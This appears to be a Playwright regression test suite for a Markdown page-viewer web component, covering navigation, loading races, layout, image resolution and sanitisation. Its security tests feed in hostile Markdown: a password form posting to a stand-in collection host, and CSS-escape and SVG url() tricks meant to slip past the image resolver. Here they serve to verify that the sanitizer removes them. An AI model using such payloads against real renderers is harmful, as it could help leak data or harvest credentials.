// Regression tests for the issues found in the third implementation review.

import { test, expect } from '@playwright/test';
import { BLANK, mount, content, sidebarLink, urlState } from './helpers.mjs';

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const long = (n) => Array.from({ length: n }, (_, i) => `段落 ${i}`).join('\n\n');
const page3 = (ids) => ids.map((id, i) => ({ id, parentId: null, title: id.toUpperCase(), order: i + 1, md: `# ${id.toUpperCase()}` }));

/** /mock/<name> answers from `routes` (json or text), after `delay` ms; `status` can be a function of the call count. */
async function mock(page, routes) {
  const calls = [];
  await page.route('**/mock/**', async (route) => {
    const name = new URL(route.request().url()).pathname.replace('/mock/', '');
    calls.push(name);
    const entry = routes[name];
    if (!entry) return route.fulfill({ status: 404, body: '' });
    if (entry.delay) await wait(entry.delay);
    const count = calls.filter((c) => c === name).length;
    const status = typeof entry.status === 'function' ? entry.status(count) : entry.status || 200;
    if (entry.json) return route.fulfill({ status, json: entry.json });
    return route.fulfill({ status, contentType: 'text/markdown', body: entry.text });
  });
  return calls;
}

async function addHostAnchor(page) {
  await page.evaluate(() => {
    const link = document.createElement('a');
    link.id = 'host-top';
    link.href = '#top';
    link.textContent = 'top';
    link.style.cssText = 'position:fixed;top:0;right:0;z-index:10';
    document.body.append(link);
  });
}

test('[デグレ/組み込み先のアンカー] a host "#" link during a reload does not cancel the fallback page or currentId', async ({ page }) => {
  await mock(page, {
    L1: { json: page3(['a', 'b', 'c']) },
    L2: { json: page3(['a', 'b']), delay: 600 },
    L3: { json: page3(['a', 'b', 'c']), delay: 600 },
  });
  await page.goto(`${BLANK}?page=c`);
  await addHostAnchor(page);
  const viewer = await mount(page, { options: { pages: '/mock/L1' } });
  await expect(content(viewer).locator('h1')).toHaveText('C');

  // C disappears from the new list: the first page opens and the URL follows.
  await page.evaluate(() => (document.querySelector('md-pages-viewer').pages = '/mock/L2'));
  await page.click('#host-top');
  await expect(content(viewer).locator('h1')).toHaveText('A');
  expect((await urlState(page)).param).toBe('a');

  // pages and currentId together, plus a host "#" click: currentId still opens.
  await page.evaluate(() => {
    const el = document.querySelector('md-pages-viewer');
    el.pages = '/mock/L3';
    el.currentId = 'b';
  });
  await page.click('#host-top');
  await expect(content(viewer).locator('h1')).toHaveText('B');
  expect((await urlState(page)).param).toBe('b');
});

test('[取得/一覧の取得中の切り替え] back, then currentId while a list loads: the later currentId wins', async ({ page }) => {
  await mock(page, { L1: { json: page3(['a', 'b', 'c']) }, L2: { json: page3(['a', 'b', 'c']), delay: 600 } });
  await page.goto(BLANK);
  const viewer = await mount(page, { options: { pages: '/mock/L1' } });
  await sidebarLink(viewer, 'B').click();
  await sidebarLink(viewer, 'C').click();
  await expect(content(viewer).locator('h1')).toHaveText('C');
  await page.evaluate(async () => {
    const el = document.querySelector('md-pages-viewer');
    el.pages = '/mock/L2';
    history.back();
    await new Promise((r) => addEventListener('popstate', r, { once: true }));
    el.currentId = 'a';
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  expect((await urlState(page)).param).toBe('a');
});

test('[取得/取得中に別のページへ] leaving and coming back while a body loads fetches it once', async ({ page }) => {
  const calls = await mock(page, { 'a.md': { text: '# A body', delay: 700 } });
  await page.goto(BLANK);
  const viewer = await mount(page, {
    options: {
      pages: [
        { id: 'b', parentId: null, title: 'B', order: 1, md: '# B' },
        { id: 'a', parentId: null, title: 'A', order: 2, src: '/mock/a.md' },
      ],
    },
  });
  await expect(content(viewer).locator('h1')).toHaveText('B');
  await sidebarLink(viewer, 'A').click();
  await sidebarLink(viewer, 'B').click();
  await sidebarLink(viewer, 'A').click();
  await expect(content(viewer).locator('h1')).toHaveText('A body');
  expect(calls.filter((c) => c === 'a.md')).toHaveLength(1);
});

test('[組み込み/取得中の取り外し] back/forward during a reload still applies after the element is put back', async ({ page }) => {
  await mock(page, { L1: { json: page3(['a', 'b', 'c']) }, L2: { json: page3(['a', 'b', 'c']), delay: 500 } });
  await page.goto(BLANK);
  const viewer = await mount(page, { options: { pages: '/mock/L1' } });
  await sidebarLink(viewer, 'B').click();
  await sidebarLink(viewer, 'C').click();
  await expect(content(viewer).locator('h1')).toHaveText('C');
  await page.evaluate(async () => {
    const el = document.querySelector('md-pages-viewer');
    el.pages = '/mock/L2';
    history.back();
    await new Promise((r) => addEventListener('popstate', r, { once: true }));
    el.remove();
    await new Promise((r) => setTimeout(r, 800));
    document.body.append(el);
  });
  await expect(content(viewer).locator('h1')).toHaveText('B');
  expect((await urlState(page)).param).toBe('b');
});

test('[URL/最初の履歴に戻る] reloading the same list for an expired body does not count as a list change', async ({ page }) => {
  await mock(page, {
    L1: { json: [{ id: 'a', parentId: null, title: 'A', order: 1, src: '/mock/a.md' }, { id: 'b', parentId: null, title: 'B', order: 2, md: '# B' }] },
    'a.md': { text: '# A', status: (n) => (n === 1 ? 403 : 200) },
  });
  await page.goto(BLANK);
  const viewer = await mount(page, { options: { pages: '/mock/L1', currentId: 'ghost' } });
  await expect(viewer.locator('.mpv-body-status')).toContainText('ページが見つかりません');
  await sidebarLink(viewer, 'A').click();
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await page.goBack();
  await expect(viewer.locator('.mpv-body-status')).toContainText('ページが見つかりません');
});

test('[表示/高さ] quirks mode: new MdPagesViewer in a target without a height grows with the body; with a height it fills it', async ({ page }) => {
  await page.route('**/quirks/new.html', (route) =>
    route.fulfill({
      contentType: 'text/html; charset=utf-8',
      body: '<html><head><script src="/dist/md-pages-viewer.js"></script></head><body><div id="box"></div><div id="after">after</div><div id="fixed" style="height:300px"></div></body></html>',
    }),
  );
  await page.goto('/quirks/new.html');
  expect(await page.evaluate(() => document.compatMode)).toBe('BackCompat');
  const md = `# A\n\n${long(60)}`;
  await page.evaluate((md) => {
    window.v1 = new MdPagesViewer('#box', { pages: [{ id: 'a', parentId: null, title: 'A', md }], urlParam: false });
    window.v2 = new MdPagesViewer('#fixed', { pages: [{ id: 'a', parentId: null, title: 'A', md }], urlParam: false });
  }, md);
  await expect(page.locator('#box md-pages-viewer .mpv-content h1')).toHaveText('A');
  await wait(300);
  const r = await page.evaluate(() => ({
    auto: window.v1.element.shadowRoot.querySelector('.mpv').dataset.height,
    height: window.v1.element.getBoundingClientRect().height,
    viewport: innerHeight,
    fixed: window.v2.element.shadowRoot.querySelector('.mpv').dataset.height,
    fixedHeight: window.v2.element.getBoundingClientRect().height,
  }));
  expect(r.auto).toBe('auto');
  expect(r.height).toBeGreaterThan(r.viewport);
  expect(r.fixed).toBe('fixed');
  expect(Math.round(r.fixedHeight)).toBe(300);
});

test('[表示/高さ] quirks mode: a short body does not push the host content below it', async ({ page }) => {
  await page.route('**/quirks/short.html', (route) =>
    route.fulfill({
      contentType: 'text/html; charset=utf-8',
      body: '<html><head><script src="/dist/md-pages-viewer.js"></script></head><body><md-pages-viewer url-param="false"></md-pages-viewer><div id="footer" style="clear:both">footer</div></body></html>',
    }),
  );
  await page.goto('/quirks/short.html');
  const viewer = page.locator('md-pages-viewer');
  await viewer.evaluate((el) => (el.pages = [{ id: 'a', parentId: null, title: 'A', md: '# A' }]));
  await expect(content(viewer).locator('h1')).toHaveText('A');
  const gap = await page.evaluate(() => document.getElementById('footer').getBoundingClientRect().top - document.querySelector('md-pages-viewer').getBoundingClientRect().bottom);
  expect(Math.abs(gap)).toBeLessThan(2);
});

test('[画像/HTMLで書いた画像] CSS escapes and SVG paint/mask url() cannot load images around imageResolver', async ({ page }) => {
  const requests = [];
  page.on('request', (r) => requests.push(r.url()));
  await page.goto(BLANK);
  const viewer = await mount(page, {
    options: {
      pages: [
        {
          id: 'a',
          parentId: null,
          title: 'A',
          md: [
            '# A',
            '<div id="e1" style="background:u\\rl(/secret-esc1.png)">e1</div>',
            '<div id="e2" style="background-image:\\75 rl(/secret-esc2.png)">e2</div>',
            '<svg width="40" height="40"><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><rect id="r1" width="40" height="40" mask="url(/secret-mask.png)"/><rect id="r2" width="40" height="40" fill="url(/secret-fill.svg#g)"/><rect id="r3" width="40" height="40" filter="u\\rl(/secret-filter.svg#f)"/><rect id="r4" width="40" height="40" fill="url(#g)"/></svg>',
          ].join('\n\n'),
        },
      ],
    },
    functions: { imageResolver: '(p) => "/resolved/" + p' },
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await wait(300);
  expect(requests.filter((u) => /secret-/.test(u))).toEqual([]);
  await expect(content(viewer).locator('#e1')).not.toHaveAttribute('style', /.*/);
  await expect(content(viewer).locator('#e2')).not.toHaveAttribute('style', /.*/);
  for (const id of ['r1', 'r2', 'r3']) {
    expect(await content(viewer).locator(`#${id}`).evaluate((el) => [...el.attributes].map((a) => a.name).filter((n) => ['mask', 'fill', 'filter'].includes(n)))).toEqual([]);
  }
  // A reference inside the document is kept.
  await expect(content(viewer).locator('#r4')).toHaveAttribute('fill', 'url(#g)');
});

test('[セキュリティ/フォーム] a form in the body is removed, so submitting cannot move the host tab', async ({ page }) => {
  await page.goto(BLANK);
  const viewer = await mount(page, {
    options: {
      pages: [
        {
          id: 'a',
          parentId: null,
          title: 'A',
          md: '# A\n\n<form action="https://external.example/collect" method="post"><input name="pw" type="password" value="x"><button id="send">send</button></form>',
        },
      ],
    },
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await expect(content(viewer).locator('form')).toHaveCount(0);
  const before = page.url();
  await content(viewer).locator('#send').click();
  await wait(300);
  expect(page.url()).toBe(before);
});

test('[リンク/見出しへのリンク] ids with "-->" still work for same-page, other-page and page-id links', async ({ page }) => {
  await page.goto(BLANK);
  const viewer = await mount(page, {
    options: {
      pages: [
        { id: 'a', parentId: null, title: 'A', order: 1, md: `# A\n\n[same](#入力--->-出力)\n\n[other](?page=b#入力--->-出力)\n\n[weird id](?page=x--%3Ey)\n\n${long(60)}\n\n## 入力 --> 出力\n\ntarget` },
        { id: 'b', parentId: null, title: 'B', order: 2, md: `# B\n\n${long(60)}\n\n## 入力 --> 出力\n\nb target` },
        { id: 'x-->y', parentId: null, title: 'X', order: 3, md: '# X' },
      ],
    },
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await content(viewer).locator('a', { hasText: 'same' }).click();
  await expect.poll(() => page.evaluate(() => window.scrollY)).toBeGreaterThan(500);
  expect((await urlState(page)).hash).toBe('入力--->-出力');

  await page.evaluate(() => window.scrollTo(0, 0));
  await content(viewer).locator('a', { hasText: 'other' }).click();
  await expect(content(viewer).locator('h1')).toHaveText('B');
  await expect.poll(() => page.evaluate(() => window.scrollY)).toBeGreaterThan(500);

  await page.evaluate(() => history.back());
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await content(viewer).locator('a', { hasText: 'weird id' }).click();
  await expect(content(viewer).locator('h1')).toHaveText('X');
  expect((await urlState(page)).param).toBe('x-->y');
});

test('[画像/HTMLで書いた画像] a srcset URL with commas reaches imageResolver whole', async ({ page }) => {
  await page.goto(BLANK);
  const viewer = await mount(page, {
    options: { pages: [{ id: 'a', parentId: null, title: 'A', md: '# A\n\n<img src="a.png" srcset="https://img.example.com/upload/w_100,h_100/a.png 1x, b.png 2x">' }] },
    functions: { imageResolver: '(p) => { (window.__seen ||= []).push(p); return "/r/" + encodeURIComponent(p); }' },
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  expect(await page.evaluate(() => window.__seen)).toEqual(['a.png', 'https://img.example.com/upload/w_100,h_100/a.png', 'b.png']);
});

test('[画像/imageResolver] when imageResolver throws, the raw path is not loaded', async ({ page }) => {
  const requests = [];
  page.on('request', (r) => requests.push(r.url()));
  await page.goto(BLANK);
  const viewer = await mount(page, {
    options: { pages: [{ id: 'a', parentId: null, title: 'A', md: '# A\n\n![ok](images/ok.png)\n\n![p](images/private.png)' }] },
    functions: { imageResolver: '(p) => { if (p.includes("private")) throw new Error("no"); return "/r/" + p; }' },
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await wait(300);
  await expect(content(viewer).locator('img[alt="p"]')).toHaveAttribute('src', '');
  expect(requests.filter((u) => u.includes('private.png'))).toEqual([]);
});

test('[画像/imageResolver] when imageResolver throws for a srcset candidate, its descriptor is not loaded as a URL', async ({ page }) => {
  const requests = [];
  page.on('request', (r) => requests.push(new URL(r.url()).pathname));
  await page.goto(BLANK);
  const viewer = await mount(page, {
    options: { pages: [{ id: 'a', parentId: null, title: 'A', md: '# A\n\n<img alt="s" srcset="images/private.png 2x, images/ok.png 3x">\n\n<picture><source srcset="images/private.webp 1x"><img alt="p" src="images/ok.png"></picture>' }] },
    functions: { imageResolver: '(p) => { if (p.includes("private")) throw new Error("no"); return "/r/" + p; }' },
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await wait(300);
  await expect(content(viewer).locator('img[alt="s"]')).toHaveAttribute('srcset', '/r/images/ok.png 3x');
  await expect(content(viewer).locator('source')).toHaveAttribute('srcset', '');
  expect(requests.filter((path) => /\/(?:[0-9.]+x|private\.\w+)$/.test(path))).toEqual([]);
});

test('[画像/相対パス（md）] with a <base> on another origin, md pages resolve against the host page URL', async ({ page }) => {
  await page.goto('/test/fixtures/review/base.html');
  const viewer = await mount(page, {
    options: { pages: [{ id: 'a', parentId: null, title: 'A', md: '# A\n\n![img](img/a.png)\n\n[guide](guide.html)' }] },
  });
  await expect(content(viewer).locator('h1')).toHaveText('A');
  await expect(content(viewer).locator('img')).toHaveAttribute('src', 'http://localhost:4173/test/fixtures/review/img/a.png');
  await expect(content(viewer).locator('a', { hasText: 'guide' })).toHaveAttribute('href', 'http://localhost:4173/test/fixtures/review/guide.html');
  await expect(content(viewer).locator('a', { hasText: 'guide' })).not.toHaveAttribute('target', '_blank');
});

test('[表示/狭い表示幅] inside a closed shadow root, clicks in the sidebar keep it open and clicks outside close it', async ({ page }) => {
  await page.setViewportSize({ width: 600, height: 800 });
  await page.goto(BLANK);
  await page.evaluate(() => {
    const header = document.createElement('div');
    header.id = 'host-header';
    header.style.height = '80px';
    header.textContent = 'host header';
    document.body.append(header);
    const holder = document.createElement('div');
    document.body.append(holder);
    const closed = holder.attachShadow({ mode: 'closed' });
    const el = document.createElement('md-pages-viewer');
    el.urlParam = false;
    el.pages = [
      { id: 'p', parentId: null, title: 'Parent', order: 1, md: '# Parent' },
      { id: 'c', parentId: 'p', title: 'Child', order: 1, md: '# Child' },
      { id: 'q', parentId: null, title: 'Other', order: 2, md: '# Other' },
    ];
    closed.append(el);
    window.__viewer = el;
  });
  const rect = (selector) =>
    page.evaluate((s) => {
      const r = window.__viewer.shadowRoot.querySelector(s).getBoundingClientRect();
      return { x: r.x + r.width / 2, y: r.y + r.height / 2 };
    }, selector);
  const isOpen = () => page.evaluate(() => window.__viewer.shadowRoot.querySelector('.mpv').hasAttribute('data-sidebar-open'));
  await expect.poll(() => page.evaluate(() => !!window.__viewer.shadowRoot.querySelector('.mpv-content h1'))).toBe(true);
  const menu = await rect('.mpv-sidebar-toggle');
  await page.mouse.click(menu.x, menu.y);
  expect(await isOpen()).toBe(true);
  await page.waitForTimeout(300); // sidebar slide-in
  const toggle = await rect('.mpv-toggle');
  await page.mouse.click(toggle.x, toggle.y);
  expect(await isOpen()).toBe(true);
  await page.mouse.click(300, 40); // the host header, outside the viewer
  expect(await isOpen()).toBe(false);
});
